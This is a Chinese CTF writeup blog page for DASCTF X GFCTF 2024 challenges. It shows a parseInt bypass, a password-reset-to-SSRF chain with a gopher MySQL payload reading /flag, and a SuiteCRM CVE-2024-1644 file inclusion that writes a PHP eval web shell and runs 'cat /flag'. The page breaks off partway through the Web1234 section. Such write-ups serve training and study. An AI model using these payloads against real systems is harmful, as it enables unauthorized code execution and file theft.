<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>DASCTF X GFCTF 2024 Writeup - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="DASCTF X GFCTF 2024 Writeup - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2024/04/30/DASCTF%20X%20GFCTF%202024%20Writeup/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2024-04-30T06:11:12.609Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>April</span>
            <span>30,</span>
            <span>2024</span>
        </div>
        

        <h2 class="title">DASCTF X GFCTF 2024 Writeup</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="队伍名称"><a href="#队伍名称" class="headerlink" title="队伍名称"></a>队伍名称</h1><p>HnuSec</p>
<h1 id="排名"><a href="#排名" class="headerlink" title="排名"></a>排名</h1><p>19 名</p>
<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="cool-index"><a href="#cool-index" class="headerlink" title="cool_index"></a>cool_index</h3><p>签到题，关键逻辑</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/article&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>;</span><br><span class="line">    <span class="keyword">if</span> (token) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>);</span><br><span class="line">            <span class="keyword">let</span> index = req.<span class="property">body</span>.<span class="property">index</span>;</span><br><span class="line">            <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">index</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;你知道我要说什么&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (decoded.<span class="property">subscription</span> !== <span class="string">&quot;premium&quot;</span> &amp;&amp; index &gt;= <span class="number">7</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line">                    .<span class="title function_">status</span>(<span class="number">403</span>)</span><br><span class="line">                    .<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;订阅高级会员以解锁&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            index = <span class="built_in">parseInt</span>(index);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="built_in">isNaN</span>(index) || index &gt; articles.<span class="property">length</span> - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;你知道我要说什么&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">json</span>(articles[index]);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            res.<span class="title function_">clearCookie</span>(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;重新登录罢&quot;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;未登录&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>前面有一堆jwt但实际上都无伤大雅，关键在于这个parseInt以及nodejs的弱类型比较。<br>我们的目标是访问到第七页，但是<code>if (decoded.subscription !== &quot;premium&quot; &amp;&amp; index &gt;= 7) &#123;</code><br>这条判断让我们无法通过，绕过很简单，index&#x3D;<code>7a</code></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/article</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>c11ecb80-b958-49f7-af22-5d7cd4552a46.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://c11ecb80-b958-49f7-af22-5d7cd4552a46.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://c11ecb80-b958-49f7-af22-5d7cd4552a46.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InBvcCIsInN1YnNjcmlwdGlvbiI6Imd1ZXN0IiwiaWF0IjoxNzEzNjIxMzQ5LCJleHAiOjE3MTM3MDc3NDl9.LtXseEZrvF4cBbm9qIVv6DzKY8bDC_z8AJeWXkXJQh4</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>13</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;index&quot;</span><span class="punctuation">:</span><span class="string">&quot;7a&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713621397412-ffced417-d7f8-4bf4-9244-65b5496b7396.png#averageHue=%23e1e7ce&clientId=u65db0307-b4e6-4&from=paste&height=1021&id=u2a1354a5&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=787716&status=done&style=none&taskId=u9f67bfa2-92ef-45c7-a97a-4f9e8250df7&title=&width=1502" alt="image.png"></p>
<h3 id="EasySignin"><a href="#EasySignin" class="headerlink" title="EasySignin"></a>EasySignin</h3><p>先注册个账号。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713621745126-d2dbeea0-7072-4e0a-a89e-f149fc06e641.png#averageHue=%23b2b2b2&clientId=u8ade7719-3014-4&from=paste&height=241&id=uffb31ef6&originHeight=482&originWidth=1856&originalType=binary&ratio=2&rotation=0&showTitle=false&size=61673&status=done&style=none&taskId=ub8f99483-0784-4eea-84f2-6fe2c6d8e24&title=&width=928" alt="image.png"><br>提示我们不能查看图片，猜测是需要管理员，加上后台有个修改密码的接口，盲猜是任意密码重置<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713621819822-c6c1aac9-e5bb-4fbd-91dd-ac6bbfff3c63.png#averageHue=%23e1e7ce&clientId=u8ade7719-3014-4&from=paste&height=1021&id=u4961cc75&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=812915&status=done&style=none&taskId=u233cbb90-5a82-47ef-852b-f0f3ba3b390&title=&width=1502" alt="image.png"><br>admin密码重置成功。接下来就去登录admin<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713621961978-1c2072bd-382c-4f23-a360-d040d79e2741.png#averageHue=%23dee6c9&clientId=u8ade7719-3014-4&from=paste&height=1021&id=u147726d2&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1374116&status=done&style=none&taskId=u9b55604b-c00c-4fd7-8f70-82d80af03e5&title=&width=1502" alt="image.png"><br>这里应该是个ssrf的接口了，经过fuzz只可以使用gopher协议和http协议，我们可以用http协议探测内网<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713622229095-6be0113b-da11-4dfe-9f08-15edb44d5c3d.png#averageHue=%23e0e6ce&clientId=u8ada0cda-7857-4&from=paste&height=1021&id=u83273b41&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=825830&status=done&style=none&taskId=ucaae45cf-4f44-4579-bfbc-0e7cc8bcc8c&title=&width=1502" alt="image.png"><br>访问3306端口有回显，内容如下</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">J<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00</span><br><span class="line">5.7.29<span class="keyword">\x</span>00<span class="keyword">\x</span>07<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00&gt;&#125;Oy<span class="keyword">\x</span>15<span class="keyword">\x</span>15<span class="comment">%^\x00\xff\xf7\x08\x02\x00\xff\x81\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Dt&gt;v&gt;?6\x1aJgYx\x00mysql_native_password\x00\x1b\x00\x00\x01\xff\x84\x04Got packets out of order</span></span><br></pre></td></tr></table></figure>
<p>低版本mysql，最终结合gopher协议读取flag文件<br>gopherus生成payload<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713622368239-7f375479-66b8-4e56-9b02-d71e5a0538ae.png#averageHue=%232b2d3f&clientId=u8ada0cda-7857-4&from=paste&height=639&id=u3223906d&originHeight=1278&originWidth=2012&originalType=binary&ratio=2&rotation=0&showTitle=false&size=346686&status=done&style=none&taskId=u9803b863-cde8-411a-b13c-41a4fd83151&title=&width=1006" alt="image.png"><br>别忘了二次编码最终payload如下</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/<span class="built_in">_</span><span class="comment">%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2524%2500%2500%2500%2503%2575%2573%2565%2520%2574%2565%2573%2574%253b%2573%2565%256c%2565%2563%2574%2520%256c%256f%2561%2564%255f%2566%2569%256c%2565%2528%2527%252f%2566%256c%2561%2567%2527%2529%253b%2501%2500%2500%2500%2501</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713622418818-19965c85-62aa-497e-bc64-4e4bb1b5254a.png#averageHue=%23d0dacb&clientId=u8ada0cda-7857-4&from=paste&height=1021&id=u51599e3f&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1154377&status=done&style=none&taskId=u505dde6c-5dce-41f4-bde3-ef8037233e5&title=&width=1502" alt="image.png"></p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">J<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00</span><br><span class="line">5.7.29<span class="keyword">\x</span>00<span class="keyword">\x</span>08<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00hT<span class="keyword">\x</span>1a<span class="keyword">\x</span>1f<span class="keyword">\x</span>14r	&gt;<span class="keyword">\x</span>00<span class="keyword">\xff</span><span class="keyword">\xf</span>7<span class="keyword">\x</span>08<span class="keyword">\x</span>02<span class="keyword">\x</span>00<span class="keyword">\xff</span><span class="keyword">\x</span>81<span class="keyword">\x</span>15<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00!`<span class="keyword">\x</span>16S<span class="comment">%\x06X\x18SLh\x00mysql_native_password\x00\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00\x10\x00\x00\x01\x00\x00\x00</span></span><br><span class="line">@<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>07<span class="keyword">\x</span>01<span class="keyword">\x</span>05<span class="keyword">\x</span>04test<span class="keyword">\x</span>01<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>02<span class="keyword">\x</span>01(<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>03<span class="keyword">\x</span>03def<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>12load<span class="built_in">_</span>file(&#x27;/flag&#x27;)<span class="keyword">\x</span>00?<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>01<span class="keyword">\xfb</span><span class="keyword">\x</span>80<span class="keyword">\x</span>00<span class="keyword">\x</span>1f<span class="keyword">\x</span>00<span class="keyword">\x</span>00.<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>04-DASCTF&#123;715d9012-12fe-42ce-ae83-18fd4285e99b&#125;</span><br><span class="line"><span class="keyword">\x</span>07<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>05<span class="keyword">\xfe</span><span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>02<span class="keyword">\x</span>00<span class="keyword">\x</span>00<span class="keyword">\x</span>00</span><br></pre></td></tr></table></figure>
<p>最终得到flag</p>
<h3 id="SuiteCRM"><a href="#SuiteCRM" class="headerlink" title="SuiteCRM"></a>SuiteCRM</h3><p>没给hint前以为是代码审计题，麻了，最后放hint发现是个简单题，当时犹豫安恒平台的问题导致可能就1解吧。<br>CVE-2024-1644<br><a target="_blank" rel="noopener" href="https://github.com/salesagility/SuiteCRM/">https://github.com/salesagility/SuiteCRM/</a><br>根据视频的操作，存在本地文件包含，而且题目又是docker环境，很容易想到pearcmd文件包含</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LegacyRedirectHandler.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getIncludeFile</span>(<span class="params">Request <span class="variable">$request</span></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">    <span class="variable">$baseUrl</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getPathInfo</span>(); <span class="comment">// Anything after the index.php file</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$baseUrl</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$baseUrl</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$baseUrl</span>, <span class="string">&#x27;.php&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$baseUrl</span> .= <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">&#x27;dir&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span> =&gt; <span class="variable">$baseUrl</span>, <span class="comment">// Arbitrary path (with custom wrapper)</span></span><br><span class="line">        <span class="string">&#x27;access&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>漏洞点在于这里，他会对index.php后面的内容本地文件包含。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713624697660-f7cb977b-54b4-4cb1-a199-9be01da59b8b.png#averageHue=%23dee4cc&clientId=u8ada0cda-7857-4&from=paste&height=1021&id=u9dcc40df&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=873901&status=done&style=none&taskId=u57de64d8-645d-48be-a10c-a153ab01904&title=&width=1502" alt="image.png"><br>可以看到返回200了，这一注意是81端口，接下里我们就pear包含，正常流程</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php//usr/local/lib/php/pearcmd.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ce1caa59-d343-4360-8aea-c775d17a6d63.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>LEGACYSESSID=81be055d743282032824d844121dba45; PHPSESSID=04d03e295b41e5622836f3b122e3b963; XSRF-TOKEN=ynCnaUpuQzEUurP2Ak5z9Px7yPb3ywqTxShSRt26LAE; ck_login_id_20=8a4b0568-268c-9812-73b3-65e88ae3bac3; ck_login_language_20=zh_CN; sugar_user_theme=suite8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://ce1caa59-d343-4360-8aea-c775d17a6d63.node5.buuoj.cn:81/</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713625537247-05466423-03db-4543-ad39-df4f48f0bc7e.png#averageHue=%23e1e7cf&clientId=u8ada0cda-7857-4&from=paste&height=1021&id=u55a8811a&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1151069&status=done&style=none&taskId=ua105e9ed-ee16-491b-adcb-bf220558fc7&title=&width=1502" alt="image.png"><br>成功创建test.php，最后本地包含rce即可</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php//tmp/test.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ce1caa59-d343-4360-8aea-c775d17a6d63.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>LEGACYSESSID=81be055d743282032824d844121dba45; PHPSESSID=04d03e295b41e5622836f3b122e3b963; XSRF-TOKEN=ynCnaUpuQzEUurP2Ak5z9Px7yPb3ywqTxShSRt26LAE; ck_login_id_20=8a4b0568-268c-9812-73b3-65e88ae3bac3; ck_login_language_20=zh_CN; sugar_user_theme=suite8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://ce1caa59-d343-4360-8aea-c775d17a6d63.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">cmd</span>=system(<span class="string">&#x27;cat /flag&#x27;</span>)<span class="comment">;</span></span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713625622590-bb470995-5bfb-4d9a-9193-3fe51c1c9503.png#averageHue=%23dee6c9&clientId=u8ada0cda-7857-4&from=paste&height=1021&id=ue1bcc46c&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1169025&status=done&style=none&taskId=u52a6e745-2b9b-48f4-99f4-1674ec28849&title=&width=1502" alt="image.png"></p>
<h3 id="Web1234（赛后解）"><a href="#Web1234（赛后解）" class="headerlink" title="Web1234（赛后解）"></a>Web1234（赛后解）</h3><p>开局<a target="_blank" rel="noopener" href="http://www.zip泄露/">www.zip泄露</a><br>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/Config&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line">        <span class="variable">$param</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>] === <span class="variable">$Config</span>-&gt;uname &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>])) === <span class="variable">$Config</span>-&gt;passwd)&#123;</span><br><span class="line">    <span class="variable">$Admin</span> = <span class="keyword">new</span> <span class="title class_">Admin</span>(<span 